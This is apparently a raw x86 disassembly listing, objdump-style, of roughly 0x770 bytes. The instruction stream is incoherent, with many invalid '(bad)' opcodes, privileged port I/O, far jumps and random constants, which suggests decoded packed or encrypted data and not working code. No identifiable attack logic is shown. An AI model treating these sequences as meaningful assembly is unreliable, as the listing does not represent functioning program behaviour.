  42e00a:	in     al,0xf6
  42e00c:	pop    esi
  42e00d:	pusha  
  42e00e:	push   ebp
  42e00f:	push   ebx
  42e010:	add    ebx,esp
  42e012:	out    0x44,al
  42e014:	punpcklwd mm0,mm4
  42e017:	rol    BYTE PTR [ebp+0x3d],1
  42e01a:	or     esi,esp
  42e01c:	cmp    dh,dh
  42e01e:	in     eax,dx
  42e01f:	rcr    DWORD PTR [ebp+0x564b6d3],0x2c
  42e026:	into   
  42e027:	push   cs
  42e028:	mov    ds:0x345dd060,al
  42e02d:	jmp    0x42dfe1
  42e02f:	xchg   DWORD PTR [eax-0x5f1911ad],esi
  42e035:	ja     0x42e082
  42e037:	add    al,0x74
  42e039:	shl    DWORD PTR [ebx+0x45a9e8e],1
  42e03f:	and    DWORD PTR [edi-0x6006e680],ecx
  42e045:	call   0xfb204c35
  42e04a:	sub    eax,0xf0913f2b
  42e04f:	fimul  DWORD PTR [eax]
  42e051:	jae    0x42e050
  42e053:	(bad)  
  42e054:	push   edx
  42e055:	pop    esi
  42e056:	lds    eax,FWORD PTR [eax]
  42e058:	mov    ?,WORD PTR [esi+eiz*4+0x78]
  42e05c:	bound  ecx,QWORD PTR [ebx-0x12]
  42e05f:	and    al,0xd0
  42e061:	pop    ebp
  42e062:	mov    ebp,0x8ac97af9
  42e067:	xchg   edi,eax
  42e068:	repnz dec esi
  42e06a:	fisubr DWORD PTR [eax]
  42e06c:	bound  esp,QWORD PTR [ecx+0x5e]
  42e06f:	test   al,0x67
  42e071:	pop    ebx
  42e072:	icebp  
  42e073:	sbb    eax,0x25aa51ac
  42e078:	mov    bl,0x9e
  42e07a:	outs   dx,BYTE PTR ds:[esi]
  42e07b:	jl     0x42e03d
  42e07d:	xchg   esi,eax
  42e07e:	clc    
  42e07f:	int3   
  42e080:	pop    esi
  42e081:	mov    esi,0x72c1e3d1
  42e086:	hlt    
  42e087:	retf   
  42e088:	mov    esp,0xcae2b142
  42e08d:	pusha  
  42e08e:	push   ds
  42e08f:	push   esi
  42e090:	lods   eax,DWORD PTR ds:[esi]
  42e091:	sbb    BYTE PTR [eax+ebx*2],0x5d
  42e095:	test   eax,0xd15a34e0
  42e09a:	mov    dh,0x37
  42e09c:	xchg   esi,eax
  42e09d:	mov    ds:0x601a3128,eax
  42e0a2:	outs   dx,DWORD PTR ds:[esi]
  42e0a3:	xlat   BYTE PTR ds:[ebx]
  42e0a4:	arpl   WORD PTR [eax],di
  42e0a6:	pushf  
  42e0a7:	shl    DWORD PTR [eax],cl
  42e0a9:	lods   eax,DWORD PTR ds:[esi]
  42e0aa:	imul   edi,ebx,0x5e
  42e0ad:	shr    BYTE PTR [ecx+0x46475431],1
  42e0b3:	push   edi
  42e0b4:	lock pusha 
  42e0b6:	jmp    0x14c7e4e4
  42e0bb:	cmp    al,cl
  42e0bd:	call   0x865f:0x721f2bee
  42e0c4:	int    0x12
  42e0c6:	cs nop
  42e0c8:	jo     0x42e0c8
  42e0ca:	jns    0x42e12e
  42e0cc:	sbb    al,0x16
  42e0ce:	call   0x82c9:0x4d9d687e
  42e0d5:	pop    esi
  42e0d6:	out    dx,al
  42e0d7:	sbb    al,0xa7
  42e0da:	(bad)  [eax+0x34]
  42e0dd:	repz fisub DWORD PTR [eax+0x6f2712b5]
  42e0e4:	mov    sp,0x5efd
  42e0e8:	push   ebx
  42e0e9:	cwde   
  42e0ea:	and    eax,0x9e61315c
  42e0ef:	sbb    bl,bh
  42e0f1:	or     edi,edi
  42e0f3:	jmp    DWORD PTR [edx]
  42e0f5:	popa   
  42e0f6:	call   0xdef8fc5f
  42e0fb:	jmp    0x42e179
  42e0fd:	nop
  42e0fe:	out    dx,al
  42e0ff:	pop    edi
  42e100:	ins    DWORD PTR es:[edi],dx
  42e101:	(bad)  
  42e102:	int3   
  42e103:	xchg   edx,eax
  42e104:	fisubr DWORD PTR cs:[ebp-0x19b77986]
  42e10b:	add    ecx,DWORD PTR [esi+0x75]
  42e10e:	and    eax,0x98175e1b
  42e113:	(bad)  
  42e114:	(bad)  
  42e115:	in     al,0xae
  42e117:	cdq    
  42e118:	sti    
  42e119:	pusha  
  42e11a:	enter  0x8f0b,0xdf
  42e11e:	int    0x61
  42e120:	sbb    eax,DWORD PTR [ebp*8-0x20317b6a]
  42e127:	cmp    al,BYTE PTR [eax-0x16d5cd13]
  42e12d:	push   edx
  42e12e:	mov    cl,0x93
  42e130:	mov    eax,ds:0x790b0e96
  42e135:	push   esp
  42e136:	call   0x977a4013
  42e13b:	hlt    
  42e13c:	fs mov ebp,0x450b2091
  42e142:	out    dx,eax
  42e143:	and    eax,0x83aa20ba
  42e148:	les    eax,FWORD PTR ds:0x2f5b29ad
  42e14e:	push   cs
  42e14f:	fwait
  42e150:	mov    eax,edx
  42e152:	jle    0x42e10e
  42e154:	or     eax,0xa8a0ba9f
  42e159:	lock pop eax
  42e15b:	jmp    0x42e103
  42e15d:	cmp    al,0x48
  42e15f:	and    dh,BYTE PTR [edx]
  42e161:	shl    DWORD PTR [ecx+eiz*4+0x1b246aaf],1
  42e168:	dec    esi
  42e169:	test   al,bl
  42e16b:	mov    al,ds:0x48dc601b
  42e170:	jmp    0xbd1b:0x5e077226
  42e177:	inc    edx
  42e178:	mov    esi,0xa5f99c0
  42e17d:	popa   
  42e17e:	cmc    
  42e17f:	lahf   
  42e180:	xor    edx,ecx
  42e182:	or     cl,BYTE PTR [edx+0x14]
  42e185:	into   
  42e186:	out    dx,al
  42e187:	add    DWORD PTR [edi+0x2bf2f9da],eax
  42e18d:	cmp    esi,eax
  42e18f:	mov    al,ds:0xd5745109
  42e194:	out    0x19,al
  42e196:	lds    eax,FWORD PTR [esi+0xff8705e]
  42e19c:	or     BYTE PTR [esi+0x556dd884],ah
  42e1a2:	mov    ds:0x6e3d8ddb,eax
  42e1a7:	cmp    ch,BYTE PTR [ebp+0x5ef8f4cb]
  42e1ad:	loopne 0x42e198
  42e1af:	(bad)  
  42e1b0:	cmp    al,BYTE PTR [esi]
  42e1b2:	pop    eax
  42e1b3:	xchg   esi,eax
  42e1b4:	pop    ds
  42e1b5:	inc    ebx
  42e1b6:	mov    dh,0x3c
  42e1b8:	add    eax,0xba24ce61
  42e1bd:	mov    dl,0x3d
  42e1bf:	mov    ebp,DWORD PTR [ebp+ecx*4-0x12]
  42e1c3:	lds    ebx,FWORD PTR [ebx]
  42e1c5:	xor    BYTE PTR [ebx],ch
  42e1c7:	pusha  
  42e1c8:	test   eax,0xf79f82ef
  42e1cd:	push   ecx
  42e1ce:	clc    
  42e1cf:	push   es
  42e1d0:	xor    ah,BYTE PTR [ecx-0x2fcc29ad]
  42e1d6:	push   eax
  42e1d7:	(bad)  
  42e1d8:	pop    esi
  42e1d9:	fcom   QWORD PTR ds:0x87f71fe0
  42e1df:	xchg   ebx,eax
  42e1e0:	pop    edx
  42e1e1:	popa   
  42e1e2:	popa   
  42e1e3:	sub    bh,BYTE PTR [ecx+0x3b95bfa0]
  42e1e9:	and    esi,ebp
  42e1eb:	imul   ecx,edi,0x5f
  42e1ee:	icebp  
  42e1ef:	outs   dx,DWORD PTR ds:[esi]
  42e1f0:	pop    ebx
  42e1f1:	xor    al,0xc9
  42e1f3:	mov    esi,0xa14c2ad4
  42e1f8:	mov    DWORD PTR [ebx+ebx*2-0x1184df4d],ebp
  42e1ff:	mov    ecx,DWORD PTR [edi+eax*1]
  42e202:	das    
  42e203:	push   esp
  42e204:	or     esi,DWORD PTR [ebx-0x50]
  42e207:	push   0xaf6cb53b
  42e20c:	inc    edi
  42e20d:	push   ebx
  42e20e:	addr16 xchg esi,eax
  42e210:	xchg   esp,eax
  42e211:	sbb    bl,ch
  42e213:	and    BYTE PTR [edx+0x5de21253],dl
  42e219:	scas   eax,DWORD PTR es:[edi]
  42e21a:	es or  al,0xc7
  42e21d:	es iret 
  42e21f:	mov    DWORD PTR [esi-0x2a],ebp
  42e222:	push   eax
  42e223:	mov    eax,ds:0xf13fbded
  42e228:	jno    0x42e20a
  42e22a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e22b:	(bad)  
  42e22c:	pusha  
  42e22d:	int    0x47
  42e22f:	cmp    eax,0x80ed3ed3
  42e234:	sub    DWORD PTR [ebx],esi
  42e236:	and    DWORD PTR [ecx+0x3c8ab3bc],0x1a
  42e23d:	push   esi
  42e23e:	mov    esp,0x62b85319
  42e243:	jne    0x42e263
  42e245:	adc    edi,DWORD PTR [esi]
  42e247:	sub    eax,0xa18210e1
  42e24c:	in     al,dx
  42e24d:	icebp  
  42e24e:	enter  0xe411,0x2
  42e252:	shl    esp,0x63
  42e255:	int3   
  42e256:	(bad)  
  42e257:	push   esi
  42e258:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e259:	xor    al,0xf5
  42e25c:	mov    cl,0xba
  42e25e:	sahf   
  42e25f:	fldenv [ecx]
  42e261:	pop    ds
  42e262:	out    dx,al
  42e263:	es inc eax
  42e265:	fidiv  WORD PTR [ecx-0x21]
  42e268:	jns    0x42e2b5
  42e26a:	xlat   BYTE PTR ds:[ebx]
  42e26b:	dec    eax
  42e26c:	pop    esi
  42e26d:	push   esi
  42e26e:	jmp    0x42e29b
  42e270:	mov    ds:0x82981591,al
  42e275:	pusha  
  42e276:	xchg   edx,eax
  42e277:	cmp    BYTE PTR [esi],0x64
  42e27a:	clc    
  42e27b:	popf   
  42e27c:	lock mov ecx,0x7d09f4eb
  42e282:	mov    al,0xfb
  42e284:	ror    DWORD PTR [eax-0xed87a8c],0xf9
  42e28b:	mov    esp,?
  42e28d:	in     al,0xb2
  42e28f:	loopne 0x42e23d
  42e291:	push   ss
  42e292:	arpl   WORD PTR [ecx],si
  42e294:	in     al,0xf5
  42e296:	out    dx,al
  42e297:	mov    ?,WORD PTR [esi+0x6b]
  42e29a:	lahf   
  42e29b:	jg     0x42e251
  42e29d:	xor    edx,DWORD PTR [ecx+eiz*4-0x7688b4e3]
  42e2a4:	inc    BYTE PTR [ecx]
  42e2a6:	xlat   BYTE PTR ds:[ebx]
  42e2a7:	rcr    BYTE PTR [esi+0x7b],0x7
  42e2ab:	add    al,0x79
  42e2ad:	int    0xaa
  42e2af:	cdq    
  42e2b0:	out    0x60,eax
  42e2b2:	imul   ebp,DWORD PTR [edx+0x2c],0x1bbe6f9
  42e2b9:	das    
  42e2ba:	adc    BYTE PTR [esi-0x1911689e],bh
  42e2c0:	push   0x1db660b5
  42e2c5:	popa   
  42e2c6:	or     BYTE PTR [ecx+0x7c],dl
  42e2c9:	adc    BYTE PTR [esi-0x12480c57],dh
  42e2cf:	ins    DWORD PTR es:[edi],dx
  42e2d0:	arpl   WORD PTR [ebp+0x498dc9bd],ax
  42e2d6:	ds xchg edi,eax
  42e2d8:	lods   eax,DWORD PTR ds:[esi]
  42e2d9:	pusha  
  42e2da:	pusha  
  42e2db:	mov    ch,0x27
  42e2dd:	ret    0x719
  42e2e0:	mov    bh,BYTE PTR [ecx+0x40e5c1ed]
  42e2e6:	jnp    0x42e35c
  42e2e8:	jmp    0x42e351
  42e2ea:	bound  edi,QWORD PTR [esi+0x1e]
  42e2ed:	popa   
  42e2ee:	test   al,0x40
  42e2f0:	lods   al,BYTE PTR ds:[esi]
  42e2f1:	xchg   edx,eax
  42e2f2:	sbb    eax,0x56361d1f
  42e2f7:	xchg   ebp,eax
  42e2f8:	pop    esi
  42e2f9:	inc    eax
  42e2fa:	xor    eax,0xa5f053bc
  42e2ff:	mov    ecx,0x2c6559d5
  42e304:	or     bl,BYTE PTR [esi]
  42e306:	jns    0x42e2e9
  42e308:	dec    esp
  42e309:	xchg   esp,eax
  42e30a:	iret   
  42e30b:	add    eax,0x10ce725e
  42e310:	cmp    BYTE PTR [ebp+0x6114aa72],0x44
  42e317:	adc    ah,BYTE PTR [ebp-0x55]
  42e31a:	pop    esp
  42e31b:	cdq    
  42e31c:	das    
  42e31d:	(bad)  
  42e31e:	out    dx,eax
  42e31f:	(bad)  
  42e320:	sub    bh,BYTE PTR [esi-0x6d]
  42e323:	bswap  edi
  42e325:	call   0xcd46:0xbedadfee
  42e32c:	pop    ss
  42e32d:	popa   
  42e32e:	fwait
  42e32f:	cmp    BYTE PTR [edi+0x3a83e0eb],dh
  42e335:	mov    dh,0x9e
  42e337:	dec    eax
  42e338:	pop    esi
  42e339:	xchg   esi,eax
  42e33a:	mov    edx,DWORD PTR [esi-0x5b]
  42e33d:	pop    eax
  42e33f:	push   ebx
  42e340:	js     0x42e39b
  42e342:	int3   
  42e343:	pop    edx
  42e344:	sbb    DWORD PTR [edi+edx*8+0x7b04b880],edi
  42e34b:	jb     0x42e3ab
  42e34d:	xor    DWORD PTR [edi],esi
  42e34f:	ror    ebp,1
  42e351:	inc    ebx
  42e352:	pushf  
  42e353:	push   ds
  42e354:	fsub   DWORD PTR [eax-0xf]
  42e357:	loopne 0x42e355
  42e359:	sahf   
  42e35a:	sti    
  42e35b:	push   ebp
  42e35c:	mov    eax,0xebf3eef1
  42e361:	push   ebp
  42e362:	fs icebp 
  42e364:	dec    eax
  42e365:	add    BYTE PTR [eax],0xad
  42e368:	aad    0x83
  42e36a:	in     al,0x8e
  42e36c:	outs   dx,DWORD PTR ds:[esi]
  42e36d:	sar    edx,1
  42e36f:	and    BYTE PTR [ebx+0x4f77124],bh
  42e375:	call   0x72127d68
  42e37a:	cmp    eax,0x826559b
  42e37f:	test   al,0x96
  42e381:	fbstp  TBYTE PTR [eax]
  42e383:	add    eax,0x2dbb80b0
  42e388:	sbb    DWORD PTR [ebp+0x76391e02],esi
  42e38e:	out    dx,al
  42e38f:	rcl    bh,1
  42e391:	jp     0x42e393
  42e393:	(bad)  
  42e394:	(bad)  
  42e395:	mov    esi,0xbd75a158
  42e39a:	ret    0xd140
  42e39d:	jmp    0x25fb:0x5251d9bb
  42e3a4:	pop    esi
  42e3a5:	out    0xd0,eax
  42e3a7:	xchg   esp,eax
  42e3a8:	jns    0x42e3a9
  42e3aa:	or     al,0x9f
  42e3ac:	(bad)  
  42e3ad:	in     al,0xbc
  42e3af:	(bad)  
  42e3b0:	pop    esi
  42e3b1:	stos   DWORD PTR es:[edi],eax
  42e3b2:	sbb    al,0x66
  42e3b4:	mov    bl,0x20
  42e3b6:	out    dx,al
  42e3b7:	mov    al,0xf6
  42e3b9:	enter  0xb936,0x54
  42e3bd:	cld    
  42e3be:	jb     0x42e439
  42e3c0:	pop    ebp
  42e3c1:	sub    eax,0x1c27a114
  42e3c6:	mov    edx,0x426403a7
  42e3cb:	das    
  42e3cc:	pop    esi
  42e3cd:	pop    esp
  42e3ce:	dec    esp
  42e3cf:	mov    esi,0x58dec9fe
  42e3d4:	popa   
  42e3d5:	pusha  
  42e3d6:	popf   
  42e3d7:	push   ecx
  42e3d8:	xor    bl,BYTE PTR [edi]
  42e3da:	(bad)  
  42e3db:	out    dx,eax
  42e3dc:	push   ss
  42e3dd:	mov    ebx,ecx
  42e3df:	pop    ecx
  42e3e0:	pop    esi
  42e3e1:	dec    ebp
  42e3e2:	dec    edi
  42e3e3:	xchg   edx,eax
  42e3e4:	scas   eax,DWORD PTR es:[edi]
  42e3e5:	jbe    0x42e3a7
  42e3e7:	inc    esi
  42e3e8:	mov    bl,0x60
  42e3ea:	cmp    DWORD PTR [ebx],eax
  42e3ec:	fsubr  st,st(2)
  42e3ee:	push   es
  42e3ef:	lods   al,BYTE PTR ds:[esi]
  42e3f0:	cmp    eax,ebp
  42e3f2:	out    dx,al
  42e3f3:	xchg   ebx,eax
  42e3f4:	(bad)  
  42e3f5:	adc    cl,BYTE PTR [esi+ecx*8]
  42e3f8:	adc    ebx,DWORD PTR [ebx+ebx*2]
  42e3fb:	mov    eax,ds:0x3d3e723
  42e400:	test   DWORD PTR [ebp+0x6e],edi
  42e403:	mov    ch,0x5f
  42e405:	jbe    0x42e403
  42e407:	fwait
  42e408:	sub    al,0xb
  42e40a:	ins    BYTE PTR es:[edi],dx
  42e40b:	jl     0x42e415
  42e40d:	add    DWORD PTR [ebx+0x32],esi
  42e410:	nop
  42e411:	pusha  
  42e412:	sub    eax,0x4813519f
  42e417:	cld    
  42e418:	(bad)  
  42e419:	sar    eax,1
  42e41b:	call   0x47302b18
  42e420:	jge    0x42e40d
  42e422:	push   edi
  42e423:	dec    edi
  42e424:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e425:	add    al,0xf7
  42e427:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e428:	lods   eax,DWORD PTR ds:[esi]
  42e429:	push   eax
  42e42a:	or     BYTE PTR [eax+0x7],ah
  42e42d:	loopne 0x42e435
  42e42f:	sbb    al,BYTE PTR [edi+0x67935c84]
  42e435:	mov    ah,0xe8
  42e437:	inc    edi
  42e438:	mov    ah,0xd2
  42e43a:	mov    esi,0x98013880
  42e43f:	loop   0x42e3f4
  42e441:	inc    ebx
  42e442:	inc    edi
  42e443:	jns    0x42e421
  42e445:	and    BYTE PTR [ebp+edi*8-0x1f6c5722],cl
  42e44c:	pop    esi
  42e44d:	outs   dx,BYTE PTR ds:[esi]
  42e44e:	xchg   cl,ch
  42e450:	and    BYTE PTR [ebp+0x39],bl
  42e453:	ins    DWORD PTR es:[edi],dx
  42e454:	sub    al,0x63
  42e456:	scas   al,BYTE PTR es:[edi]
  42e457:	and    al,0xee
  42e459:	pusha  
  42e45a:	frstor [ecx]
  42e45c:	add    DWORD PTR [ecx],ebx
  42e45e:	adc    ebp,esi
  42e460:	or     BYTE PTR [eax+0x0],bh
  42e463:	loop   0x42e438
  42e465:	scas   al,BYTE PTR es:[edi]
  42e466:	scas   al,BYTE PTR es:[edi]
  42e467:	(bad)  
  42e468:	mov    ah,0xba
  42e46a:	jbe    0x42e483
  42e46c:	repz push 0xc75a02c5
  42e472:	call   0x8157:0xb0e096ac
  42e479:	push   ecx
  42e47a:	lahf   
  42e47b:	add    cl,BYTE PTR [edx-0x6189add9]
  42e481:	pusha  
  42e482:	std    
  42e483:	popf   
  42e484:	gs push ss
  42e486:	dec    esi
  42e487:	xchg   ebp,eax
  42e488:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e489:	or     al,0xee
  42e48b:	mov    bl,0x1a
  42e48d:	test   al,0x3c
  42e48f:	mov    ds:0xa17ce673,al
  42e494:	adc    DWORD PTR [esp+ebp*8+0x5c],edi
  42e498:	out    dx,al
  42e499:	hlt    
  42e49a:	js     0x42e4eb
  42e49c:	fs gs xor edx,edi
  42e4a0:	jmp    0xda7c5367
  42e4a5:	add    al,0x6f
  42e4a7:	xor    DWORD PTR [edx-0x736c740],ebp
  42e4ad:	push   cs
  42e4ae:	out    dx,al
  42e4af:	cmp    eax,0x23409e82
  42e4b4:	jp     0x42e4a3
  42e4b6:	out    dx,al
  42e4b7:	bnd jbe 0x42e521
  42e4ba:	pop    ecx
  42e4bb:	(bad)  
  42e4bd:	retf   
  42e4be:	inc    ebx
  42e4bf:	mov    eax,ds:0x2b8cb813
  42e4c4:	mov    ebx,0x54e6ac5f
  42e4c9:	jecxz  0x42e4d2
  42e4cb:	cmp    BYTE PTR [esi],bl
  42e4cd:	mov    ds:0xb53a4200,al
  42e4d2:	imul   esp,DWORD PTR [ecx+0x561d0dcb],0xffffffe4
  42e4d9:	cs (bad) 
  42e4db:	and    eax,0xd622015f
  42e4e0:	(bad)  
  42e4e1:	jmp    0x42e562
  42e4e3:	pop    ecx
  42e4e4:	fdivr  QWORD PTR [esi]
  42e4e6:	retf   
  42e4e7:	les    eax,FWORD PTR [eax+0x55]
  42e4ea:	frstor [eax+0x7d7a6bdd]
  42e4f0:	ins    DWORD PTR es:[edi],dx
  42e4f1:	pop    ecx
  42e4f2:	out    dx,al
  42e4f3:	jae    0x42e504
  42e4f5:	into   
  42e4f6:	fld    DWORD PTR [eax]
  42e4f8:	aas    
  42e4f9:	inc    esp
  42e4fa:	jge    0x42e49d
  42e4fc:	lahf   
  42e4fd:	out    dx,eax
  42e4fe:	sti    
  42e4ff:	ins    DWORD PTR es:[edi],dx
  42e500:	or     edx,DWORD PTR [esi+edi*2-0x8]
  42e504:	pop    esi
  42e505:	xchg   ebp,eax
  42e506:	mov    BYTE PTR [edx+0xaf6e892],ch
  42e50c:	inc    esi
  42e50d:	popa   
  42e50e:	sbb    al,0x4c
  42e510:	outs   dx,BYTE PTR ds:[esi]
  42e511:	xor    dh,bh
  42e513:	pusha  
  42e514:	pop    ebp
  42e515:	stc    
  42e516:	out    0x59,eax
  42e518:	mov    eax,0x5e73c6b5
  42e51d:	sbb    ebp,eax
  42e51f:	mov    ah,0x46
  42e521:	push   ebx
  42e522:	or     al,0x9e
  42e524:	pop    ebx
  42e525:	adc    DWORD PTR [esi+0x4666a5bc],ebp
  42e52b:	ficomp DWORD PTR [esi+0x2e]
  42e52e:	add    bh,BYTE PTR [eax-0x219c0f4a]
  42e534:	mov    bl,0x64
  42e536:	pop    es
  42e537:	sahf   
  42e538:	fisub  WORD PTR [ecx-0x17]
  42e53b:	push   es
  42e53c:	pop    ds
  42e53d:	pushf  
  42e53e:	mov    edx,DWORD PTR [edx+0x64]
  42e541:	sbb    al,BYTE PTR [ecx-0x5e9f4327]
  42e547:	cmc    
  42e548:	dec    eax
  42e549:	sahf   
  42e54a:	and    BYTE PTR [ecx+0x49478593],0xec
  42e551:	cdq    
  42e552:	xor    ah,dl
  42e554:	pop    esi
  42e555:	bound  ebp,QWORD PTR [ebx+edi*8-0x71adae60]
  42e55c:	xchg   ebp,eax
  42e55d:	pusha  
  42e55e:	shl    BYTE PTR ds:0x895a4661,1
  42e564:	fldl2e 
  42e566:	out    dx,al
  42e567:	cli    
  42e568:	cmp    eax,0x10ef6eef
  42e56d:	leave  
  42e56e:	mov    eax,0x28e64a8f
  42e573:	mov    eax,ds:0x64b0ad9b
  42e578:	or     eax,0x20dbef69
  42e57d:	sahf   
  42e57e:	xlat   BYTE PTR ds:[ebx]
  42e57f:	inc    eax
  42e580:	not    eax
  42e582:	xchg   BYTE PTR [esi+0xf6e6073],ch
  42e588:	imul   eax,DWORD PTR [esi+0x2b9eb796],0xffffffee
  42e58f:	lea    esi,[edi]
  42e591:	popf   
  42e592:	pop    ebx
  42e593:	mov    ch,0x8
  42e595:	addr16 push cs
  42e597:	test   al,0x91
  42e599:	adc    ch,bh
  42e59b:	rcr    DWORD PTR [ebx],1
  42e59d:	push   ecx
  42e59e:	push   0xeed19dba
  42e5a3:	std    
  42e5a4:	retf   0x29f9
  42e5a7:	mov    ebx,0xaf528fde
  42e5ac:	aad    0x71
  42e5ae:	ins    DWORD PTR es:[edi],dx
  42e5af:	xor    ebp,ebp
  42e5b1:	frstor [ecx+eiz*2-0x80]
  42e5b5:	popf   
  42e5b6:	xchg   esi,eax
  42e5b7:	aaa    
  42e5b8:	fdivr  QWORD PTR [edx]
  42e5ba:	out    dx,al
  42e5bb:	mov    dl,0x61
  42e5bd:	imul   eax,ebx,0xd3829dda
  42e5c3:	mov    eax,ds:0xbd91d23a
  42e5c8:	aas    
  42e5c9:	mov    ch,BYTE PTR [ecx-0x11315590]
  42e5cf:	mov    ds:0x6d2e4e00,al
  42e5d4:	inc    ebx
  42e5d5:	push   cs
  42e5d6:	fucomp st(6)
  42e5d8:	retf   
  42e5d9:	gs cmc 
  42e5db:	jmp    0xaca3:0xdd30785e
  42e5e2:	mov    ds:0xf7b45e38,al
  42e5e7:	mov    esp,DWORD PTR [ebx+0xf]
  42e5ea:	mov    bh,0x1d
  42e5ec:	cli    
  42e5ed:	pusha  
  42e5ee:	fadd   st(4),st
  42e5f0:	imul   edx,edx,0x5bc513e8
  42e5f6:	out    dx,al
  42e5f7:	sub    al,0x93
  42e5f9:	inc    ebx
  42e5fa:	into   
  42e5fb:	sub    eax,DWORD PTR ds:0x27a0d3e0
  42e601:	test   eax,0xc9aaca62
  42e606:	sahf   
  42e607:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e608:	hlt    
  42e609:	pop    ss
  42e60a:	jmp    0x42e689
  42e60c:	sub    DWORD PTR [esi-0x5e],esp
  42e60f:	pop    edi
  42e610:	mov    edi,0x1a396fd0
  42e615:	popa   
  42e616:	sub    esi,DWORD PTR [edi-0x4dea748f]
  42e61c:	dec    ecx
  42e61d:	outs   dx,BYTE PTR ds:[esi]
  42e61e:	in     eax,dx
  42e61f:	and    ecx,DWORD PTR [edi]
  42e621:	arpl   cx,cx
  42e623:	mov    al,0x90
  42e625:	inc    esi
  42e626:	inc    edx
  42e627:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e628:	mov    bh,0x5d
  42e62a:	jge    0x42e5d9
  42e62c:	mov    ah,0x73
  42e62e:	fldenv [ecx+0x3a44c9e]
  42e634:	pop    esi
  42e635:	mov    esi,0xa0492a62
  42e63a:	ret    
  42e63b:	pop    es
  42e63c:	retf   0x9f60
  42e63f:	popf   
  42e640:	push   ebp
  42e641:	adc    DWORD PTR [eax],esi
  42e643:	pop    ss
  42e644:	and    DWORD PTR [eax-0x12],edx
  42e647:	enter  0xea10,0x42
  42e64b:	outs   dx,BYTE PTR ds:[esi]
  42e64c:	pop    ebx
  42e64d:	fwait
  42e64e:	test   al,0x6a
  42e650:	scas   al,BYTE PTR es:[edi]
  42e651:	push   ecx
  42e652:	fld    TBYTE PTR [edx+0x77cc9109]
  42e658:	pop    edx
  42e659:	sbb    bh,BYTE PTR [edi+0x1faeaba0]
  42e65f:	mov    al,ds:0x2286883
  42e664:	xor    ah,ch
  42e666:	out    dx,al
  42e667:	sbb    bl,dh
  42e669:	jnp    0x42e63d
  42e66b:	mov    ?,eax
  42e66d:	pop    ebp
  42e66e:	adc    BYTE PTR [ebp+0x7cee428a],dh
  42e674:	sbb    al,0xa5
  42e676:	inc    esi
  42e677:	mov    al,bh
  42e679:	fisttp WORD PTR gs:[ebx+eiz*8+0x512d9970]
  42e681:	pop    esi
  42e682:	lods   eax,DWORD PTR ds:[esi]
  42e683:	fidiv  WORD PTR [edx]
  42e685:	push   0x8d66a4a6
  42e68a:	push   ss
  42e68b:	stc    
  42e68c:	jg     0x42e68b
  42e68e:	out    dx,al
  42e68f:	(bad)  
  42e692:	inc    ecx
  42e693:	pop    ebp
  42e694:	dec    esi
  42e695:	push   esi
  42e696:	(bad)  
  42e697:	fisubr DWORD PTR [eax+0x5e4bd2c0]
  42e69d:	shl    DWORD PTR [edi],cl
  42e69f:	and    eax,0x42a8c707
  42e6a4:	jnp    0x42e706
  42e6a6:	out    dx,eax
  42e6a7:	adc    esi,DWORD PTR [ebx]
  42e6a9:	cmp    BYTE PTR [eax-0x11994cf1],0x71
  42e6b0:	scas   al,BYTE PTR es:[edi]
  42e6b1:	sub    DWORD PTR [esi-0x5c595f48],esp
  42e6b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e6b8:	pop    esp
  42e6b9:	adc    eax,0x2281dbde
  42e6be:	mov    ds,WORD PTR [edx+0x26]
  42e6c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e6c2:	adc    cl,BYTE PTR [edi-0x27]
  42e6c5:	js     0x42e6b5
  42e6c7:	hlt    
  42e6c8:	or     ebp,DWORD PTR [edx]
  42e6ca:	xchg   ecx,eax
  42e6cb:	mov    ah,0xbf
  42e6cd:	mov    ah,0x27
  42e6cf:	mov    eax,ds:0x482c0790
  42e6d4:	dec    edx
  42e6d5:	fld    DWORD PTR [ebx-0x24]
  42e6d8:	pop    esi
  42e6d9:	xor    al,0x99
  42e6db:	jmp    0xcb3a836b
  42e6e0:	mov    BYTE PTR [eax-0x16],ah
  42e6e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e6e4:	mov    dl,0x7c
  42e6e6:	inc    eax
  42e6e7:	repnz call FWORD PTR [edi]
  42e6ea:	out    dx,al
  42e6eb:	imul   edi,DWORD PTR ds:0x27cfc011,0x34a8c6ec
  42e6f5:	cld    
  42e6f6:	outs   dx,BYTE PTR ds:[esi]
  42e6f7:	repz out dx,eax
  42e6f9:	lahf   
  42e6fa:	pusha  
  42e6fb:	mov    edi,0xf7eee755
  42e700:	ret    0x7e86
  42e703:	push   esi
  42e704:	scas   eax,DWORD PTR es:[edi]
  42e705:	icebp  
  42e706:	xor    esi,esp
  42e708:	lds    ecx,FWORD PTR [ecx+0x30]
  42e70b:	mov    esp,0x8a36516b
  42e710:	sahf   
  42e711:	or     eax,0x72465b12
  42e716:	add    DWORD PTR [ecx+eax*1-0x1f8651b1],ebx
  42e71d:	inc    ecx
  42e71e:	ret    0x511c
  42e721:	push   edx
  42e722:	lods   al,BYTE PTR ds:[esi]
  42e723:	adc    al,0x8b
  42e725:	and    ch,BYTE PTR [esi]
  42e727:	mov    WORD PTR [ecx+0x3154c0f5],cs
  42e72d:	adc    bh,0xa2
  42e730:	mov    ebx,0x77be72ea
  42e735:	shl    BYTE PTR [ecx-0x149ea2f7],0x6d
  42e73c:	out    0x3c,al
  42e73e:	in     eax,0x75
  42e740:	sbb    BYTE PTR [esi-0x3104ea12],cl
  42e746:	data16 loopne 0x42e706
  42e749:	adc    eax,0x60b60967
  42e74e:	inc    eax
  42e74f:	xchg   ebp,eax
  42e750:	in     al,dx
  42e751:	fadd   DWORD PTR [eax]
  42e753:	daa    
  42e754:	pop    ebx
  42e755:	push   esp
  42e756:	and    al,0xb9
  42e758:	mov    ds:0x48c912e0,eax
  42e75d:	inc    edx
  42e75e:	aad    0x28
  42e760:	aam    0xb4
  42e762:	xchg   ecx,eax
  42e763:	mov    ds:0x4e135f1e,al
  42e768:	in     al,dx
  42e769:	jecxz  0x42e795
  42e76b:	sbb    DWORD PTR [eax],0xc6deeea0
  42e771:	mov    bl,0xc
